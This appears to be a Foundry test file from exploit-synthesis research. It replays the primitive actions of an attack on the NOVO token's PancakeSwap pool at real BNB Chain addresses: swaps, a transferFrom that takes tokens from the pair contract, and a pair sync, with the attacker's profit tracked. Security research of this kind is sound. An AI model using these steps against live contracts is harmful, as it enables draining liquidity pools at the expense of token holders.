// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity >0.7.0;

import "ds-test/test.sol";
import {stdCheats} from "forge-std/stdlib.sol";
import {Vm} from "forge-std/Vm.sol";
import {Strings} from "mylib/StringCon.sol";
import "../interfaces/NovoI.sol";

contract Novo is DSTest, stdCheats {
    Vm public constant vm = Vm(HEVM_ADDRESS);
    address payable attacker;
    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    INOVO novo = INOVO(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333);
    IPancakePair PancakePair = IPancakePair(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D);
    IPancakeRouter PancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    address[] path;

    function setUp() public {
        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("FakeAttacker"))))));
        vm.deal(attacker, 20 ether);
        path = new address[](2);
        vm.startPrank(attacker);
        wbnb.deposit{value: 20 * 10 ** 18}();
        wbnb.approve(address(PancakeRouter), type(uint256).max);
        novo.approve(address(PancakePair), novo.balanceOf(address(this)));
    }

    function profitSummary() internal returns (string memory _uintAsString) {
        uint256 balance1 = wbnb.balanceOf(address(attacker)) / 10 ** 16;
        return Strings.appendWithSpace("FlashSyn: ", balance1);
    }

    function testExample0_() public {
        emit log("=================== Separator ==================");
        // Action: SwapFeeWBNB2NOVO
        path[0] = address(wbnb);
        path[1] = address(novo);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1 * 1e16, 1, path, address(attacker), block.timestamp
        );
        emit log("=================== Separator ==================");
        revert("");
    }

    function testExample1_() public {
        emit log("=================== Separator ==================");
        // Action: TransferFrom
        novo.transferFrom(address(PancakePair), address(novo), 1 * 1e9);
        emit log("=================== Separator ==================");
        revert("");
    }

    function testExample2_() public {
        emit log("=================== Separator ==================");
        // Action: PancakePairSync
        PancakePair.sync();
        emit log("=================== Separator ==================");
        revert("");
    }

    function testExample3_() public {
        // Action: SwapFeeWBNB2NOVO
        path[0] = address(wbnb);
        path[1] = address(novo);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1 * 1e16, 1, path, address(attacker), block.timestamp
        );
        emit log("=================== Separator ==================");
        // Action: SwapFeeNovo2WBNB
        path[0] = address(novo);
        path[1] = address(wbnb);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1 * 1e9, 1, path, address(attacker), block.timestamp
        );
        emit log("=================== Separator ==================");
        revert("");
    }
}
